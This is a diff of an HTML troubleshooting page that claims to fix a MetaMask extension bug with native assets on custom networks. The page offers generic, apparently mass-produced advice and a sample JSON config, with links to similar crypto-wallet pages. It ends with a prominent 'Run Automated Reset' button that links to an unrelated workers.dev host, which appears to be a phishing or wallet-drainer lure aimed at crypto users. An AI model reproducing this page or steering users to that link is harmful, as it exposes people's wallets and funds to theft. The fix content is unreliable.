@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Native Assets For Custom Networks – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
+        font-family: BlinkMacSystemFont;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,36 +42,36 @@
 <h1>Metamask Extension Bug Assets Native Assets For Custom Networks</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users are unable to view native assets for custom networks when selected in the Metamask extension, resulting in incomplete asset listings.</li>
+<li>Users are unable to view native assets for custom networks when selected in the Metamask extension, despite proper configuration.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension that prevents it from properly fetching and displaying native assets for custom networks, likely caused by an issue with the extension's asset retrieval logic or network configuration.</li>
+<li>The error occurs due to a bug in the Metamask extension that prevents it from properly fetching and displaying native assets for custom networks, often resulting from outdated extension versions or incorrect network configuration.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Update the Metamask extension to the latest version</li>
-<li>Reset the Metamask extension settings to default</li>
-<li>Use the following JSON configuration to manually add the native asset:</li>
+<li>Update Metamask extension to the latest version to ensure compatibility with custom networks.</li>
+<li>Verify that the custom network is correctly configured in the Metamask settings, including the chain ID, RPC URL, and currency symbol.</li>
+<li>Use the following JSON configuration to manually add native assets for custom networks:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;custom-network&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">12345</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;rpcUrl&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://custom-network-rpc.com&quot;</span><span class="p">,</span>
 <span class="w">  </span><span class="nt">&quot;nativeAsset&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
+<span class="w">    </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;CUSTOM&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Custom Network Native Asset&quot;</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console to verify the configuration. </p>
+<p>Consider utilizing an external console for more complex configurations.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured</li>
-<li>Custom network added to the Metamask extension</li>
-<li>Latest version of the Metamask extension installed</li>
+<li>Metamask extension installed and configured for custom networks.</li>
+<li>Basic understanding of Ethereum blockchain and custom network configuration.</li>
+<li>Access to the custom network's RPC URL and chain ID.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
